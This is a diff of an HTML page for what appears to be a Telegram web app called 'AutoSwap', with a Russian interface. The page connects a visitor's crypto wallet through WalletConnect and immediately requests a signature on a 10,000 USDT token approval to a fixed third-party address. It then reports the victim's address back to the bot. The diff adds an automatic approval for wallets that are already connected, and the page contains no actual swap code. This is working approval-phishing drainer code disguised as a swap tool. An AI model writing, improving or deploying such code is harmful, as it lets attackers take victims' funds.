@@ -3,39 +3,97 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>AutoSwap — approve USDT to Wallet</title>
+  <title>AutoSwap — approve USDT</title>
   <style>
-    body { margin:0; padding:20px; background:#000; color:#e0e0e0; font-family:'Segoe UI',sans-serif; text-align:center; }
-    .container { max-width:500px; margin:0 auto; padding:30px; }
-    canvas { display:block; margin:20px auto; }
-    #manual-uri { margin-top:10px; font-size:14px; word-break:break-all; background:rgba(255,255,255,0.05); padding:10px; border-radius:8px; }
-    #status { margin-top:20px; font-size:16px; white-space:pre-wrap; }
-    .uri-link, .reconnect-btn {
-      display:inline-block; margin:8px 5px; color:#4fc3f7;
-      text-decoration:underline; cursor:pointer;
+    body {
+      margin: 0;
+      padding: 20px;
+      background: #000;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      max-width: 360px;
+      width: 100%;
+      padding: 30px;
+      background: #111;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.7);
+      text-align: center;
+    }
+    h1 {
+      margin-bottom: 20px;
+      font-size: 20px;
+      color: #4fc3f7;
+    }
+    canvas, #manual-uri {
+      margin: 20px auto;
+      background: #222;
+      padding: 16px;
+      border-radius: 8px;
+    }
+    #manual-uri {
+      font-size: 14px;
+      word-break: break-all;
+      color: #bbb;
+    }
+    #status {
+      margin: 20px 0;
+      font-size: 16px;
+      color: #ccc;
+      min-height: 40px;
+    }
+    .btn {
+      display: inline-block;
+      margin: 10px 5px;
+      padding: 12px 24px;
+      background: #4fc3f7;
+      color: #000;
+      font-weight: bold;
+      font-size: 14px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background .2s, transform .1s;
+      text-decoration: none;
+    }
+    .btn:hover {
+      background: #67ccff;
+      transform: translateY(-2px);
+    }
+    .btn:active {
+      transform: translateY(0);
+    }
+    .uri-link {
+      color: #bbdefb;
+      text-decoration: underline;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🔄 AutoSwap — approve USDT</h1>
-    <canvas id="qrcode"></canvas>
+    <h1>🔄 AutoSwap — подключение</h1>
+    <canvas id="qrcode" width="240" height="240"></canvas>
     <div id="manual-uri">URI будет здесь</div>
     <div id="status">Инициализация...</div>
     <div>
-      <span id="reconnect" class="reconnect-btn">🔁 Повторно подключиться</span>
+      <button id="reconnect" class="btn">🔁 Подключиться заново</button>
     </div>
   </div>
 
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
-
   <script type="module">
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
     import { ethers } from 'https://esm.sh/ethers@6.14.3';
     const { Interface, parseUnits, getAddress } = ethers;
 
-    const tg = window.Telegram.WebApp;
+    const tg = window.Telegram?.WebApp;
     if (tg) tg.ready();
 
     const statusEl = document.getElementById("status");
@@ -43,87 +101,77 @@
     const qrCanvas = document.getElementById("qrcode");
     const reconnectBtn = document.getElementById("reconnect");
 
-    let client, session;
+    let client = null, session = null;
 
-    const setStatus = (msg, color="#4fc3f7") => {
+    const setStatus = (msg, color="#ccc") => {
       statusEl.textContent = msg;
       statusEl.style.color = color;
     };
 
     const setURI = (uri) => {
-      uriEl.innerHTML = uri;
-      if (tg) {
+      uriEl.textContent = uri || '';
+      if (uri && tg) {
         const link = document.createElement("a");
-        link.textContent = "Открыть кошелёк";
+        link.textContent = "Открыть в кошельке";
         link.className = "uri-link";
         link.onclick = () => { tg.openTelegramLink(uri); return false; };
         uriEl.appendChild(link);
       }
     };
 
-    reconnectBtn.onclick = async () => {
-      if (session) {
-        await client.disconnect({ topic: session.topic, code: 6000, message: "User reconnected" });
-        setStatus("🛑 Сессия разорвана, создаём новую...", "#ffa500");
-        uriEl.innerHTML = "";
-        qrCanvas.getContext('2d').clearRect(0, 0, qrCanvas.width, qrCanvas.height);
-        await connectWallet();
-      } else {
-        await connectWallet();
-      }
-    };
+    reconnectBtn.onclick = () => init();
 
     async function connectWallet() {
-      setStatus("📷 Генерация QR‑кода…");
       const { uri, approval } = await client.connect({
         requiredNamespaces: {
           eip155: {
             chains: ["eip155:56"],
-            methods: ["eth_sendTransaction"],
-            events: ["chainChanged", "accountsChanged"]
+            methods:["eth_sendTransaction"],
+            events:["chainChanged","accountsChanged"]
           }
         }
       });
-
-      if (uri) {
-        QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
-        setURI(uri);
-        setStatus("📱 Сканируйте QR‑код или нажмите ссылку");
-      }
-
+      QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
+      setURI(uri);
+      setStatus("📱 Сканируйте или нажмите ссылку", "#4fc3f7");
       session = await approval();
       const address = session.namespaces.eip155.accounts[0].split(":")[2];
-      setStatus(`✅ Кошелёк подключён: ${address}`, "#66bb6a");
-      executeApprove(address);
+      setStatus(`✅ Подключено: ${address}`, "#66bb6a");
+      await doApprove(address);
+      client.on("session_delete", () => {
+        session = null;
+        setStatus("⚠️ Сессия разорвана", "#ffa500");
+      });
     }
 
-    async function executeApprove(address) {
-      setStatus(`✔ Адрес: ${address}`, "#66bb6a");
+    async function doApprove(address) {
       const amount = parseUnits("10000", 18);
       const usdt = getAddress("0x55d398326f99059ff775485246999027b3197955");
       const receiver = getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE");
-      const data = new Interface(["function approve(address,uint256)"]).encodeFunctionData(
-        "approve", [receiver, amount]
-      );
-
+      const data = new Interface(["function approve(address,uint256)"])
+        .encodeFunctionData("approve", [receiver, amount]);
       try {
-        setStatus("🚀 Отправка approve...");
-        const txHash = await client.request({
-          topic: session.topic, chainId: "eip155:56",
-          request: { method: "eth_sendTransaction", params: [{ from: address, to: usdt, data }] }
+        setStatus("🚀 Отправка approve...", "#4fc3f7");
+        const tx = await client.request({
+          topic: session.topic,
+          chainId: "eip155:56",
+          request: { method: "eth_sendTransaction", params:[{ from:address, to:usdt, data }] }
         });
-        setStatus(`✅ Approve отправлен:\n${txHash}`, "#66bb6a");
+        setStatus(`✅ Approve tx:\n${tx}`, "#66bb6a");
         if (tg) tg.sendData(JSON.stringify({ address }));
       } catch (e) {
         console.error(e);
-        setStatus(`❌ Ошибка транзакции: ${e.message || e.reason}`, "#ff6b6b");
+        setStatus(`❌ Ошибка: ${e?.message||e?.reason}`, "#ff6b6b");
       }
     }
 
     async function init() {
-      setStatus("🔌 Инициализация WalletConnect…");
+      setStatus("🔌 Инициализация...", "#ccc");
+      setURI('');
+      qrCanvas.getContext('2d').clearRect(0, 0, qrCanvas.width, qrCanvas.height);
+
       client = await SignClient.init({
-        projectId: "d868f90cd734355ae0328b6b1",
+        projectId: "d868f90cd734355ae0328f8f0258b6b1",
         relayUrl: "wss://relay.walletconnect.com",
         metadata: {
           name: "AutoSwap Approve Flow",
@@ -133,11 +181,12 @@
         }
       });
 
-      const sessions = await client.session.getAll();
-      if (sessions.length > 0) {
-        session = sessions[0];
+      const existing = await client.session.getAll();
+      if (existing.length > 0) {
+        session = existing[0];
         const address = session.namespaces.eip155.accounts[0].split(":")[2];
-        setStatus(`🔁 Уже подключён: ${address}`, "#66bb6a");
+        setStatus(`🔁 Уже подключено: ${address}`, "#66bb6a");
+        await doApprove(address);
       } else {
         await connectWallet();
       }
